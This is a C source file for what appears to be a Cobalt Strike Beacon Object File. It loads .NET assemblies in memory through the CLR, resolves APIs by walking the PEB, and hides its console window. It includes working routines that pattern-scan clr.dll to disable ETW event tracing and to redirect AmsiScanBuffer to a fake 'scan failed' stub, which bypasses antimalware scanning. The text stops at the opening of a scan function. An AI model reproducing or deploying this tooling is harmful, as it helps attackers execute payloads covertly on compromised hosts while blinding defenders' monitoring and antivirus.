#include <windows.h>
#include <wchar.h>

#include "beacon.h"
#include "inlineExecute.h"

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// WinAPI function declarations
typedef BOOL (WINAPI *_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *_SetStdHandle)(DWORD, HANDLE);
typedef HANDLE (WINAPI *_GetStdHandle)(DWORD);
typedef BOOL (WINAPI *_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *_CloseHandle)(HANDLE);
typedef BOOL (WINAPI *_AllocConsole)(VOID);
typedef HWND (WINAPI *_GetConsoleWindow)(VOID);
typedef BOOL (WINAPI *_ShowWindow)(HWND, int);
typedef BOOL (WINAPI *_FreeConsole)(VOID);
typedef DWORD (WINAPI *_GetTickCount)(VOID);
typedef HMODULE (WINAPI *_LoadLibraryA)(LPCSTR lpLibFileName);
typedef DWORD (WINAPI *_GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef DWORD (WINAPI *_GetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef BOOL (WINAPI *_GetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL (WINAPI *_VerQueryValueA)(LPCVOID, LPCSTR, LPVOID, PUINT);

// MSVCRT function declarations
DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT void __cdecl MSVCRT$free(void*);

// Structure to hold all COM objects for cleanup
typedef struct _CLRContext {
    ICLRMetaHost* pClrMetaHost;
    ICLRRuntimeInfo* pRuntimeInfo;
    ICorRuntimeHost* pCorRuntimeHost;
    IUnknown* pAppDomainThunk;
    AppDomain* pSacrifcialAppDomain;
    Assembly* pAssembly;
    MethodInfo* pMethodInfo;
} CLRContext;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY;

// PEB struct for peb-walk
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PEB_LDR_DATA* Ldr;
} PEB;

// Obtain DLL imagebase via PEB-walk 
static HMODULE getImageBase(WCHAR* targetDllName) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;
    
    while (curr != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->DllBase == NULL) {
            break;
        }
        
        WCHAR* dllName = (WCHAR*)entry->BaseDllName.Buffer;

        void* dllBase = entry->DllBase;
        if (MSVCRT$_wcsicmp(dllName, targetDllName) == 0) {
            return dllBase;
        }
        curr = curr->Flink;
    }
    return NULL;
}

// Obtain WinAPI ptr via PEB-walk
static void* getProcAddr(void* imageBase, char* exportName) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)imageBase;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)imageBase + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir =
        (IMAGE_EXPORT_DIRECTORY*)((BYTE*)imageBase +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* namesRVA = (DWORD*)((BYTE*)imageBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)imageBase + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)imageBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* funcName = (char*)imageBase + namesRVA[i];
        WORD ordinal = ordinals[i];
        void* funcAddr = (BYTE*)imageBase + functions[ordinal];

        if (MSVCRT$strcmp(funcName, exportName) == 0) {
            return funcAddr;
        }
    }

    return NULL;
}

static BOOL startCLR(CLRContext* ctx, size_t verbose) {
    HRESULT hr;

    // Initialize CLR FIRST
    hr = MSCOREE$CLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)&ctx->pClrMetaHost);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CLRCreateInstance failed: 0x%x\n", hr);
        return FALSE;
    }

    hr = ctx->pClrMetaHost->lpVtbl->GetRuntime(ctx->pClrMetaHost, L"v4.0.30319", &xIID_ICLRRuntimeInfo, (LPVOID*)&ctx->pRuntimeInfo);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetRuntime failed: 0x%08x\n", hr);
        ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost);
        return FALSE;
    }

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Runtime info obtained\n");
    }

    BOOL loadable;
    hr = ctx->pRuntimeInfo->lpVtbl->IsLoadable(ctx->pRuntimeInfo, &loadable);
    if (FAILED(hr) || !loadable) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Runtime is not loadable: 0x%08x (loadable: %d)\n", hr, loadable);
        ctx->pRuntimeInfo->lpVtbl->Release(ctx->pRuntimeInfo);
        ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost);
        return FALSE;
    }

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Runtime is loadable\n");
    }

    ICorRuntimeHost* pCorRuntimeHost = NULL;
    hr = ctx->pRuntimeInfo->lpVtbl->GetInterface(ctx->pRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)&ctx->pCorRuntimeHost);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetInterface failed: 0x%08x\n", hr);
        ctx->pRuntimeInfo->lpVtbl->Release(ctx->pRuntimeInfo);
        ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost);
        return FALSE;
    }

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ICorRuntimeHost obtained\n");
    }

    hr = ctx->pCorRuntimeHost->lpVtbl->Start(ctx->pCorRuntimeHost);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CLR Start failed: 0x%08x\n", hr);
        ctx->pCorRuntimeHost->lpVtbl->Release(ctx->pCorRuntimeHost);
        ctx->pRuntimeInfo->lpVtbl->Release(ctx->pRuntimeInfo);
        ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost);
        return FALSE;
    }

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] CLR started successfully\n");
    }
    return TRUE;
}

static BOOL createPipe(HMODULE kernel32Base, HANDLE* phReadPipe, HANDLE* phWritePipe, size_t verbose) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // NOW create pipe and console (AFTER CLR is started)
    _CreatePipe pCreatePipe = (_CreatePipe)getProcAddr(kernel32Base, "CreatePipe");

    // request for 1mb buffer
    if (!pCreatePipe(phReadPipe, phWritePipe, &sa, 1048576)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreatePipe failed\n");
        return FALSE;
    }

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Anonymous pipe created\n");
    }
    return TRUE;
}

static BOOL createConsole(HMODULE kernel32Base, size_t verbose) {
    _GetConsoleWindow pGetConsoleWindow = (_GetConsoleWindow)getProcAddr(kernel32Base, "GetConsoleWindow");

    BOOL consoleExisted = (pGetConsoleWindow() != NULL);
    BOOL allocatedConsole = FALSE;

    if (!consoleExisted) {
        _AllocConsole pAllocConsole = (_AllocConsole)getProcAddr(kernel32Base, "AllocConsole");
        pAllocConsole();
        allocatedConsole = TRUE;
        
        HMODULE hUser32 = GetModuleHandleA("user32.dll");
        _ShowWindow pShowWindow = (_ShowWindow)GetProcAddress(hUser32, "ShowWindow");
        HWND hWnd = pGetConsoleWindow();
        if (hWnd) {
            pShowWindow(hWnd, 0);
        }
        
        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Console created and hidden\n");
        }
    }

    return allocatedConsole;
}

static HANDLE redirectPipes(HMODULE kernel32Base, HANDLE hReadPipe, HANDLE hWritePipe, size_t verbose) {
    _SetStdHandle pSetStdHandle = (_SetStdHandle)getProcAddr(kernel32Base, "SetStdHandle");
    _GetStdHandle pGetStdHandle = (_GetStdHandle)getProcAddr(kernel32Base, "GetStdHandle");

    // Save original stdout
    HANDLE hOriginalStdout = pGetStdHandle(STD_OUTPUT_HANDLE);

    if (hOriginalStdout == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // Set stdout to write pipe handle
    pSetStdHandle(STD_OUTPUT_HANDLE, hWritePipe);
    pSetStdHandle(STD_ERROR_HANDLE, hWritePipe);

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Redirected stdout/stderr to pipe\n");
    }

    return hOriginalStdout;
}

static BOOL createAppDomain(HMODULE kernel32Base, CLRContext* ctx, HANDLE hOriginalStdout, size_t verbose) {
    _SetStdHandle pSetStdHandle = (_SetStdHandle)getProcAddr(kernel32Base, "SetStdHandle");

    HRESULT hr;
    hr = ctx->pCorRuntimeHost->lpVtbl->CreateDomain(ctx->pCorRuntimeHost, (LPCWSTR)L"PlaceholderDoman", NULL, &ctx->pAppDomainThunk);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateDomain failed: 0x%08x\n", hr);
        return FALSE;
    }
    
    hr = ctx->pAppDomainThunk->lpVtbl->QueryInterface(ctx->pAppDomainThunk, &xIID_AppDomain, (VOID**)&ctx->pSacrifcialAppDomain);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] QueryInterface for AppDomain failed: 0x%08x\n", hr);
        return FALSE;
    }

    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AppDomain Created\n");
    }
    return TRUE;
}

static BOOL loadAssembly(HMODULE kernel32Base, unsigned char* assemblyBytes, size_t assemblyLength, HANDLE hOriginalStdout, CLRContext* ctx, size_t verbose) {
    _SetStdHandle pSetStdHandle = (_SetStdHandle)getProcAddr(kernel32Base, "SetStdHandle");
    
    SAFEARRAYBOUND bounds[1];
    bounds[0].cElements = assemblyLength;
    bounds[0].lLbound = 0;
    
    SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, 1, bounds);
    if (pSafeArray == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create SafeArray\n");
        return FALSE;
    }

    void* pvData = NULL;
    HRESULT hr;
    hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &pvData);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SafeArrayAccessData failed: 0x%08x\n", hr);
        OLEAUT32$SafeArrayDestroy(pSafeArray);
        return FALSE;
    }

    MSVCRT$memcpy(pvData, assemblyBytes, assemblyLength);
    
    hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SafeArrayUnaccessData failed: 0x%08x\n", hr);
        OLEAUT32$SafeArrayDestroy(pSafeArray);
        return FALSE;
    }
    
    hr = ctx->pSacrifcialAppDomain->lpVtbl->Load_3(ctx->pSacrifcialAppDomain, pSafeArray, &ctx->pAssembly);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Load_3 failed: 0x%08x\n", hr);
        OLEAUT32$SafeArrayDestroy(pSafeArray);
        return FALSE;
    }
    
    if (verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Assembly Loaded\n");
    }

    hr = ctx->pAssembly->lpVtbl->EntryPoint(ctx->pAssembly, &ctx->pMethodInfo);
    if (hr != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Process refusing to find entry point of assembly.\n");
        return FALSE;	
    }

    return TRUE;
}

static wchar_t** parseArgs(char* assemblyArgs, int* argc) {
    size_t converted = 0;
    size_t len = MSVCRT$strlen(assemblyArgs) + 1;
    wchar_t* assemblyArgsW = (wchar_t*)MSVCRT$malloc(len * sizeof(wchar_t));
    MSVCRT$mbstowcs_s(&converted, assemblyArgsW, len, assemblyArgs, _TRUNCATE);
    LPWSTR* argv = SHELL32$CommandLineToArgvW(assemblyArgsW, argc);

    return argv;
}

static BOOL executeAssembly(HMODULE kernel32Base, CLRContext* ctx, char* assemblyArgs) {
    VARIANT retVal;
    ZeroMemory(&retVal, sizeof(VARIANT));
    VARIANT obj;
    ZeroMemory(&obj, sizeof(VARIANT));
    obj.vt = VT_NULL;

    int argc;
    wchar_t** argv = parseArgs(assemblyArgs, &argc);
    // BeaconPrintf(CALLBACK_OUTPUT, "[D] argc: %d\n", argc);

    VARIANT vtPsa = { 0 };
    // Always create the array, just with 0 or more elements
    vtPsa.vt = (VT_ARRAY | VT_BSTR);
    vtPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argc); // Works with argc=0!

    // Only populate if we have arguments
    for (long i = 0; i < argc; i++) {
        wchar_t* argument = argv[i];
        BSTR bstrArg = OLEAUT32$SysAllocString(argument);
        if (bstrArg) {
            OLEAUT32$SafeArrayPutElement(vtPsa.parray, &i, bstrArg);
            // OLEAUT32$SysFreeString(bstrArg);
        }
    }

    // Always pass the array (even if empty)
    SAFEARRAY* psaStaticMethodArgs = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, 1);
    long idx = 0;
    OLEAUT32$SafeArrayPutElement(psaStaticMethodArgs, &idx, &vtPsa);
    
    // EXECUTE ASSEMBLY
    HRESULT hr;
    hr = ctx->pMethodInfo->lpVtbl->Invoke_3(ctx->pMethodInfo, obj, psaStaticMethodArgs, &retVal);
    
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Assembly execution failed with HRESULT: 0x%08x\n", hr);
        return FALSE;
    }    

    // CLEANUP - DO NOT destroy vtPsa.parray directly!
    // Let VariantClear handle it
    OLEAUT32$VariantClear(&retVal);
    OLEAUT32$VariantClear(&obj);
    OLEAUT32$VariantClear(&vtPsa); // This will destroy vtPsa.parray

    if (NULL != psaStaticMethodArgs) {
        OLEAUT32$SafeArrayDestroy(psaStaticMethodArgs);
        psaStaticMethodArgs = NULL;
    }

    return TRUE;
}

static char* readOutput(HANDLE hReadPipe, DWORD* pTotalBytesRead) {
    DWORD bytesToRead = 65536;
    char* returnData = (char*)MSVCRT$malloc(bytesToRead);
    MSVCRT$memset(returnData, 0, bytesToRead);
    
    DWORD bytesRead = 0;
    DWORD totalBytesRead = *pTotalBytesRead;
    
    while (KERNEL32$ReadFile(hReadPipe, returnData + totalBytesRead, bytesToRead - totalBytesRead - 1, &bytesRead, NULL) && bytesRead > 0) {
        totalBytesRead += bytesRead;
        if (totalBytesRead >= bytesToRead - 1) {
            break;
        }
    }

    *pTotalBytesRead = totalBytesRead;
    return returnData;
}

static void cleanupCLR(HMODULE kernel32Base, CLRContext* ctx) {
    // Cleanup in reverse order of creation    
    if (ctx->pMethodInfo) {
        ctx->pMethodInfo->lpVtbl->Release(ctx->pMethodInfo);
        ctx->pMethodInfo = NULL;
    }
    
    if (ctx->pAssembly) {
        ctx->pAssembly->lpVtbl->Release(ctx->pAssembly);
        ctx->pAssembly = NULL;
    }

    // unloads Sacrificial AppDomain
    if (ctx->pCorRuntimeHost && ctx->pSacrifcialAppDomain) {
        ctx->pCorRuntimeHost->lpVtbl->UnloadDomain(ctx->pCorRuntimeHost, (IUnknown *)(ctx->pSacrifcialAppDomain));
    } 
    
    if (ctx->pSacrifcialAppDomain) {
        ctx->pSacrifcialAppDomain->lpVtbl->Release(ctx->pSacrifcialAppDomain);
        ctx->pSacrifcialAppDomain = NULL;
    }
    
    if (ctx->pAppDomainThunk) {
        ctx->pAppDomainThunk->lpVtbl->Release(ctx->pAppDomainThunk);
        ctx->pAppDomainThunk = NULL;
    }

    if (ctx->pCorRuntimeHost) {
        ctx->pCorRuntimeHost->lpVtbl->Stop(ctx->pCorRuntimeHost);
        ctx->pCorRuntimeHost->lpVtbl->Release(ctx->pCorRuntimeHost);
        ctx->pCorRuntimeHost = NULL;
    }
    
    if (ctx->pRuntimeInfo) {
        ctx->pRuntimeInfo->lpVtbl->Release(ctx->pRuntimeInfo);
        ctx->pRuntimeInfo = NULL;
    }
    
    if (ctx->pClrMetaHost) {
        ctx->pClrMetaHost->lpVtbl->Release(ctx->pClrMetaHost);
        ctx->pClrMetaHost = NULL;
    }

    _FreeConsole pFreeConsole = (_FreeConsole)getProcAddr(kernel32Base, "FreeConsole");
    pFreeConsole();

    BeaconPrintf(CALLBACK_OUTPUT, "[+] CLR cleanup complete\n");
}

static void restoreStd(HMODULE kernel32Base, HANDLE hOriginalStdout, HANDLE hWritePipe) {
    // Restore STD handles
    _SetStdHandle pSetStdHandle = (_SetStdHandle)getProcAddr(kernel32Base, "SetStdHandle");
    pSetStdHandle(STD_ERROR_HANDLE, hOriginalStdout);
    pSetStdHandle(STD_OUTPUT_HANDLE, hOriginalStdout);

    // Close write pipes
    _CloseHandle pCloseHandle = (_CloseHandle)getProcAddr(kernel32Base, "CloseHandle");
    pCloseHandle(hWritePipe);
}

int getImageSize(void* imageBase) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)imageBase;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)imageBase + dos->e_lfanew);
    int sizeOfImage = nt->OptionalHeader.SizeOfImage;
    return sizeOfImage;
}

int isMovRcxCall(unsigned char* instrAddr) {    
    if (instrAddr[0] != 0x48) {
        return 0;
    }

    if (instrAddr[1] != 0x8b) {
        return 0;
    }

    if (instrAddr[2] != 0x0d) {
        return 0;
    }

    if (instrAddr[7] != 0xe8) {
        return 0;
    }
    return 1;
}

int isEtwFunc(unsigned char* funcAddr, void* etwEventWrite) {
    int i = 0;
    while (1) {
        unsigned char* currAddr = funcAddr + i;
        unsigned char currByte = *currAddr;

        if (currByte == 0xc3) {
            return 0;
        }

        unsigned char nextByte = *(currAddr + 1);

        if (currByte != 0xff || nextByte != 0x15) {
            i += 1;
            continue;
        }

        int iatOffset = *(int*)(currAddr + 2);
        unsigned char* rip = (currAddr + 6);
        int* iatAddr = *(int**)(rip + iatOffset);

        if (iatAddr == etwEventWrite) {
            break;
        }

        i += 1;
    }
    return 1;
}

int hasCoTemplateEventDescriptorCall(unsigned char* addr, void* etwEventWrite) {
    // test    cs:Microsoft_Windows_DotNETRuntimeEnableBits, 40000000h (10 bytes)
    // jz      short loc_* (2 bytes)
    // lea     rdx, DebugIPCEventEnd (7 bytes)
    // call    CoTemplateEventDescriptor (5 bytes)
    unsigned char* callInstrAddr = addr + 10 + 2 + 7;
    unsigned char* rip = addr + 10 + 2 + 7 + 5;

    if (*callInstrAddr != 0xe8) { 
        return 0; // not a call
    }    

    int offset = *(DWORD*)(callInstrAddr + 1);
    unsigned char* funcAddr = rip + offset;

    return isEtwFunc(funcAddr, etwEventWrite);
}

int* findDotNETRuntimeEnableBits() {
    void* clrBase = getImageBase(L"clr.dll");
    int clrSize = getImageSize(clrBase);

    void* ntdllBase = getImageBase(L"ntdll.dll");
    void* etwEventWrite = getProcAddr(ntdllBase, "EtwEventWrite");

    // assuming a max of 20 global variables that match the pattern
    int MAX = 20;
    int* globalVars[20] = { 0 };
    int globalVarCounts[20] = { 0 };

    for (int i = 0; i < clrSize; i++) {
        unsigned char* addr = (unsigned char*)clrBase + i;

        // matching "test cs:Microsoft_Windows_DotNETRuntimeEnableBits, 80000000h"
        if (addr[0] != 0xf7 || addr[1] != 0x5) {
            continue;
        }

        if (*(DWORD*)(addr + 6) != 0x80000000 && *(DWORD*)(addr + 6) != 0x40000000) {
            continue;
        }

        if (!hasCoTemplateEventDescriptorCall(addr, etwEventWrite)) {
            continue;
        }

        // calculating global var address
        unsigned char* rip = addr + 10;
        int offset = *(DWORD*)(addr + 2);
        int* globalVarAddr = (int*)(rip + offset);

        // storing frequency of potential vars that could be Microsoft_Windows_DotNETRuntimeEnableBits
        for (int i = 0; i < MAX; i ++) {
            if (globalVars[i] == 0) {
                globalVars[i] = globalVarAddr;
                globalVarCounts[i] = 1;
                break;
            }

            if (globalVars[i] == globalVarAddr) {
                globalVarCounts[i] += 1;
            }
        }
    }

    // return the most frequent var - that would be Microsoft_Windows_DotNETRuntimeEnableBits
    int mostFreq = 0;
    for (int i = 1; i < MAX; i ++) {
        if (globalVarCounts[mostFreq] < globalVarCounts[i]) {
            mostFreq = i;
        }
    }

    return globalVars[mostFreq];
}

int* findDotNetRuntimeHandle() {
    void* clrBase = getImageBase(L"clr.dll");
    int clrSize = getImageSize(clrBase);

    void* ntdllBase = getImageBase(L"ntdll.dll");
    void* etwEventWrite = getProcAddr(ntdllBase, "EtwEventWrite");

    // assuming a max of 20 global variables that match the pattern
    int MAX = 20;
    int* handles[20] = { 0 };
    int handleCounts[20] = { 0 };

    for (int i = 0; i < clrSize; i++) {
        unsigned char* addr = (unsigned char*)clrBase + i;
        if (isMovRcxCall(addr) != 1) {
            continue;    
        }

        int callOffset =  *(int*)(addr + 8);
        unsigned char* rip = addr + 12;
        unsigned char* callAddr = rip + callOffset;

        if (isEtwFunc(callAddr, etwEventWrite) == 0) {
            continue;
        }

        int handleOffset = *(int*)(addr + 3);
        void* handleAddr = addr + 7 + handleOffset;

        if (handleAddr == NULL) {
            continue;
        }

        // store and increment counts in array
        for (int i = 0; i < MAX; i ++) {
            if (handles[i] == 0) {
                handles[i] = handleAddr;
                handleCounts[i] = 1;
                break;
            }

            if (handles[i] == handleAddr) {
                handleCounts[i] += 1;
            }
        }
    }

    // return the most frequent handle
    int mostFreq = 0;
    for (int i = 1; i < MAX; i ++) {
        if (handleCounts[mostFreq] < handleCounts[i]) {
            mostFreq = i;;
        }
    }

    return handles[mostFreq];
}

void turnOffEtwHandle(int* handleAddr, int* handleVal) {
    *handleVal = *handleAddr;
    *handleAddr = 1;
}

void turnOnEtwHandle(int* handleAddr, int handleVal) {
    *handleAddr = handleVal;
}

void turnOffEtwEnableBits(int* enableBitsAddr, int* enableBitsVal) {
    *enableBitsVal = *enableBitsAddr;
    *enableBitsAddr = 0;
}

void turnOnEtwEnableBits(int* enableBitsAddr, int enableBitsVal) {
    *enableBitsAddr = enableBitsVal;
}

int isCallGetProcAddress(unsigned char* addr, void* getProcAddress_addr) {
    // match "call"
    if (addr[0] != 0xff || addr[1] != 0x15) {
        return 0; 
    }

    int iatOffset = *(DWORD*)(addr + 2);
    unsigned char* rip = addr + 6;
    unsigned char* iatAddress = (rip + iatOffset);

    // match "cs:__imp_GetProcAddress"
    if (*(DWORD**)iatAddress != getProcAddress_addr) {
        return 0;
    }

    return 1;
}

int isLeaAmsiScanBuffer(unsigned char* addr) {
    // lea  rdx, aAmsiinitialize ; "AmsiInitialize"
    if (addr[0] != 0x48 || addr[1] != 0x8d || addr[2] != 0x15) {
        return 0;
    }

    unsigned char* rip = addr + 7;
    int offset = *(DWORD*)(addr + 3);
    char* string = rip + offset;

    if (MSVCRT$strcmp("AmsiScanBuffer", string) != 0) {
        return 0;
    }

    return 1;
}

int isMovAmsiScanBufferGlobal(unsigned char* addr) {
    // mov cs:?AmsiScanBuffer, <r64>
    return addr[0] == 0x48 && addr[1] == 0x89;
}

int isMovAmsiContext(unsigned char* addr) {
    // mov <r64>, cs:?g_amsiContext
    return addr[0] == 0x48 && addr[1] == 0x8b;
}

int fakeAmsiScanBuffer() {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] fakeAmsiScanBuffer called\n");
    return 1; // fake a "scan failed"
}

int findAmsiGlobals(long long* p_AmsiScanBufferGlobal, long long* p_amsiContext, size_t verbose) {
    int SEARCH_MAX_BYTES = 20;

    void* clrBase = getImageBase(L"clr.dll");
    int clrSize = getImageSize(clrBase);

    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    void* getProcAddress_addr = GetProcAddress(kernel32, "GetProcAddress");

    for (int i = 0; i < clrSize; i++) {
        unsigned char* addr = (unsigned char*)clrBase + i;

        if (!isLeaAmsiScanBuffer(addr)) {
            continue;
        }

        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found \"lea rdx, aAmsiScanBuffer\" at %p\n", addr);
        }
        addr += 7;

        // checks the next 20 bytes for this signature
        // call cs:__imp_GetProcAddress
        for (int i = 0; i < SEARCH_MAX_BYTES; i++) {
            if (isCallGetProcAddress(addr, getProcAddress_addr)) {
                break;
            }
            if (i == SEARCH_MAX_BYTES - 1) {
                return 0;
            }
            addr += 1;
        }

        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Found \"call cs:__imp_GetProcAddress\" at %p\n", addr);
        }
        addr += 6;

        // checks the next 20 bytes for this signature
        // mov cs:?AmsiInitialize, <r64>
        for (int i = 0; i < SEARCH_MAX_BYTES; i++) {
            if (isMovAmsiScanBufferGlobal(addr)) {
                break;
            }
            if (i == SEARCH_MAX_BYTES - 1) {
                return 0;
            }
            addr += 1;
        }

        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Suspected \"mov  cs:?AmsiScanBuffer, <r64>\" at %p\n", addr);
        }
        // printf("%p: %x %x %x\n", addr, addr[0], addr[1], addr[2]);

        unsigned char* rip = addr + 7;
        int offset = *(int*)(addr + 3);
        *p_AmsiScanBufferGlobal = (long long)(rip + offset);

        addr += 7;
        for (int i = 0; i < SEARCH_MAX_BYTES; i++) {
            if (isMovAmsiContext(addr)) {
                break;
            }
            if (i == SEARCH_MAX_BYTES - 1) {
                return 0;
            }
            addr += 1;
        }

        if (verbose) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Suspected \"mov <r64>, cs:?g_amsiContext\" at %p\n", addr);
        }

        rip = addr + 7;
        offset = *(int*)(addr + 3);
        *p_amsiContext = (long long)(rip + offset);

        return 1;
    }

    return 0;
}

void turnOffAmsi(long long p_AmsiScanBufferGlobal, long long p_amsiContext, long long* p_savedAmsiScanBuffer, long long* p_savedAmsiContext) {
    *p_savedAmsiScanBuffer = *(long long*)p_AmsiScanBufferGlobal;
    *p_savedAmsiContext = *(long long*)p_amsiContext;

    *(long long*)p_AmsiScanBufferGlobal = (long long)fakeAmsiScanBuffer;
    *(long long*)p_amsiContext = 1;
}

void turnOnAmsi(long long p_AmsiScanBufferGlobal, long long p_amsiContext, long long p_savedAmsiScanBuffer, long long p_savedAmsiContext) {
    *(long long*)p_AmsiScanBufferGlobal = p_savedAmsiScanBuffer;
    *(long long*)p_amsiContext = p_savedAmsiContext;
}

void printClrVersion(HMODULE clrBase) {
    HMODULE kernel32Base = getImageBase(L"KERNEL32.DLL");
    _LoadLibraryA loadLibraryA = (_LoadLibraryA)getProcAddr(kernel32Base, "LoadLibraryA");
    _GetModuleFileNameA getModuleFileNameA = (_GetModuleFileNameA)getProcAddr(kernel32Base, "GetModuleFileNameA");

    char clrPath[512] = {0};
    int len = getModuleFileNameA(clrBase, clrPath, (DWORD)sizeof(clrPath));

    HMODULE hVersion = loadLibraryA("version.dll");

    _GetFileVersionInfoSizeA getFileVersionInfoSizeA = (_GetFileVersionInfoSizeA)getProcAddr(hVersion, "GetFileVersionInfoSizeA");
    DWORD dummy = 0;
    DWORD verSize = getFileVersionInfoSizeA(clrPath, &dummy);
    void *verData = MSVCRT$malloc(verSize);

    _GetFileVersionInfoA getFileVersionInfoA = (_GetFileVersionInfoA)getProcAddr(hVersion, "GetFileVersionInfoA");
    getFileVersionInfoA(clrPath, 0, verSize, verData);

    VS_FIXEDFILEINFO *pInfo = NULL;
    UINT infoLen = 0;
    _VerQueryValueA verQueryValueA = (_VerQueryValueA)getProcAddr(hVersion, "VerQueryValueA");
    verQueryValueA(verData, "\\", (LPVOID*)&pInfo, &infoLen);

    DWORD ms = pInfo->dwFileVersionMS;
    DWORD ls = pInfo->dwFileVersionLS;
    DWORD major = HIWORD(ms);
    DWORD minor = LOWORD(ms);
    DWORD build = HIWORD(ls);
    DWORD revision = LOWORD(ls);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] clr.dll path: %s\n", clrPath);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] clr.dll build: %u.%u.%u.%u\n", major, minor, build, revision);
}

// display all patchable addresses and clr version
void doScan() {
